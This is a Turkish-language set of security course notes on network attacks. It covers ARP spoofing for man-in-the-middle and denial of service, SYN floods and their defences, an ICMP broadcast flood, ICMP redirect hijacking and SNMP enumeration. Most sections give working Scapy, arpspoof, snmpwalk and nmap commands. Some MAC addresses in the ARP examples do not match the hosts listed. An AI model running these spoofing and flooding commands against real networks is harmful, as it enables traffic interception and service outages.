## Network Saldırıları

**- ARP Kullanılarak Yapılabilecek Saldırı Örnekleri:** Haberleşmek isteyen sistemlerin ya haberleşememesine sebep olmak ya da haberleşmeleriyle ilgili olan kısma kendisini de dahil etmektir. Maksat zarar vermek ise, servis dışı etmek için kullanılabilir(DoS). Maksat fayda sağlamak ise hedefin trafiğinin kendi üzerimizden geçmesini sağlamaktır. Trafiği kendi üzerimizden geçirdiğimiz saldırı türü Man in the Middle(MITM) olarak adlandırılır.

**- İşleyiş:** Attacker, server ile client arasında ARP ile bağlantı kurar. Attacker, server'in IP adresine kendi MAC adresini ekleyerek client'e ARP paketi yollar. Client'in ARP tablosundaki IP-MAC değerleri yoksa yazılır, varsa saldırganın yolladığı şekilde güncellenir. Bir sonraki isteği client, saldırgana yollayacaktır. Eğer saldırgan aynı işlemi server için de yaparsa (kendi IP'sini client olarak gösterip MAC adresine kendi MAC adresini vermek) Man in the middle saldırısı olacak ve trafik saldırganın üzerinden geçecek. Eğer saldırgan server için bu işlemi yapmazsa client cevap alamayacak ve servis dışı kalacak(Dos). 

**- Uygulama:**

    -Server IP: 192.168.0.23, MAC:00:0c:29:6b:f3:9f
    
    -Client IP: 192.168.31.31, MAC:00:0c:29:6b:97:48
    
    -Attacker IP: 192.168.0.105, MAC:00:0c:29:f0:0b:61

    => scapy
    
    => sendp(Ether(dst="00:0c:29:6b:97:48")/ARP(op=2,psrc="192.168.0.23",pdst="192.168.31.31",hwsrc="00:0c:29:f0:0b:61",hwdst="00:0c:29:49:97:48")) 
    
    => sendp(Ether(dst="00:0c:29:6b:f3:9f")/ARP(op=2,psrc="192.168.31.31",pdst="192.168.0.23",hwsrc="00:0c:29:f0:0b:61",hwdst="00:0c:29:49:f3:9f"))
    
    => echo 1 > /proc/sys/net/ipv4/ip_forward/ (router = 1 yapma işlemi)

  * Tool kullanarak:
    
    => arpspoof -i eth0 -c both

**- SYN Flood:** Sahte bir IP ile sürekli SYN paketi yollanır. Yollanan paketleri hedef SYN tablosunda tutar. Hedefin döndürdüğü SNY+ACK paketi boşa gideceği için cevap gelmez ve tablonun boyutu artar (DoS). 

  * **Alınabilecek önlemler:** 
  
  **1.** Tablonun boyutunu arttırmak (Maliyet + çözüm değil). 
    
  **2. Syn proxy:** (Syn proxy'i bütün portlara syn yollayarak tespit edebiliriz. Eğer kapalı port yoksa syn proxy ile karşı karşıya olduğumuzu anlarız.) Hedef ile aramızda durarak SYN paketlerini kendi üzerine alır SYN+ACK gönderir. ACK geri geldiğinde paketi hedefe ulaştırır. 

  **3. Syn proxy cookie:** Threeway Handshake esnasında değişmeyen 4 bilgi var. Bunlar: Source IP, Source Port, Destination IP, Destination Port. Makine bir fonksiyon ile bu 4 bilgiyi ve bir de makine çalıştırılmaya başladığında RAM de random oluşan bir değeri topluyor. Ardından bu "toplam"ı SYN isteği yollayan makinelere SYN+ACK döndüreceği zaman sequence number olarak kullanıyor. Kendisine threeway handshake'in son aşaması olan ACK paketi döndüğünde ACK sayısı "toplam"+1 olmak zorunda. "toplam"+1 den 1 çıkarıp gelen ACK paketini doğruluyor.

**- UDP/ICMP kullanılarak yapılabilecek bir saldırı:** İç ağdayken ağdaki herkese kaynak IP, hedefin IP'si olarak gösterilip ping yollanır. Herkes birden hedefe ping reply döner. 

  **- Uygulama:**

    => echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts (broadcast yapabilmemiz için bu dosyanın değerinin 0 olması gerek, yoksa icmp paketlerini broadcast olarak yollayamayız.)
    
    => scapy
    
    => send(IP(src="hedef",dst="broadcast")/ICMP(type=8),loop=1)

**- ICMP Redirect(type=5):** ICMP Redirect mesajı, kendisine ulaşmak isteyen makineye bir router(yönlendirici) tarafından eğer bağlanabileceği daha iyi bir router varsa, bunun bilgisini döndürür.

**- ICMP Redirect ile Man in the Middle Attack (ICMP type=5):** Hedefe daha iyi bir router olduğunu, bu router'in biz olduğumuzu söylediğimiz saldırı. Bu sayede hedef bizi router olarak kullanmaya çalışacak, hedefin trafiğini üzerimize alacağız. 
      => scapy
      
      => send(IP(src="192.168.0.1",dst="192.168.0.9")/ICMP(type=5,code=1,gw="192.168.0.10")/IP(src="192.168.0.9",dst="46.45.154.70")/TCP(flags="S",dport=80,sport=5555))

**- SNMP (Simple Network Management Protocol):** SNMP, UDP Protokolü ile çalışır. 161 portunu kullanır.

**- MIB/OID:** Ağın dallara ayrılarak hangi dalın kaçıncı MIB'i şeklinde bir sorguya dönen bilgiler OID diye geçer. Bu bilgilerle MIB içerisinde konumunu bildiğimiz bir makinenin OID bilgilerine ulaşabiliriz.

  - MIB sayılarla ifade edilir. Alt dallara geçmek için araya nokta konur. 
  
  - Örnek: .1.3.6

**- Community String:** SNMP paketi içerisinde yer alan bir bilgidir. 

  * SNMP paketi içerisinde yer alan community string'ler: Public(read only), private(write). Community string ele geçirilerek bu yetkiler elde edilebilir.

  * Üç versiyon vardır. V1 ve V2 Community String üzerinden gider. V3 ise username-password'da kullanır.

  **- Uygulama:**  
    
    => snmpwalk -v 1 -c public 192.168.0.39 .1.3.6.1.2.1.2.2

  * İnternette "linux system oid's" şeklinde arama yapılarak OID örneklerine ulaşılabilir.

**- Ödev:** 192.168.0.39'dan SNMP ile bilgi topla:

    => snmpwalk -v 1 -c public 192.168.0.39 .1.3.6.1.2.1.2.2

    - NMAP ile: => nmap -p161 -T5 -sU --script=snmp-*.nse 192.168.0.39 -vv

## Soru-Cevap

- TCP/UDP'de yapacağımız IP sahteciliği (IP Spoofing) başarılı olabilir mi?

  * TCP içerisinde çok zor. Eğer seq/ack sayılarına sahipsek yapabiliriz. UDP içerisinde ise herhangi bir doğrulama sistemi olmadığı için basitçe yapılabilir.

###### Notlar 

- TCP'de IP spoofing, olmayan bir IP spoof edilerek karşıya kör(blind) bir şekilde, cevapları almadan sürekli paket yollanılarak yapılır. Eğer spoof ettiğimiz IP gerçekten kullanılıyor ise, RST döner.

- [Scapy ile SYN Flood ödevi](../99-Scapy-Ornekleri/Scapy_Syn_Flood/syn_flood.py)

- [Scapy ile SNMP bilgi toplama ödevi](../99-Scapy-Ornekleri/Scapy_SNMP/scapy_snmp.py)

